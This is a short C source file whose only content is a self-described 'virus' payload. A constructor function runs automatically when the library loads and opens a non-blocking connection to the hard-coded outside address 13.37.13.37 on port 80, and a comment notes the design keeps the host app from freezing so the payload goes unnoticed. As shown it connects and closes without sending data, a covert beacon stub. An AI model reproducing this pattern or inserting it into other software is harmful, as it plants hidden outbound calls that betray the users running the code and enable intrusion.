#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
__attribute__((constructor)) void run_payload() {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    
    //  NEW: Set socket to non-blocking so the virus doesn't freeze the app! 
    int flags = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, flags | O_NONBLOCK);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(80);
    server.sin_addr.s_addr = inet_addr("13.37.13.37");
    
    connect(s, (struct sockaddr *)&server, sizeof(server));
    close(s);
}
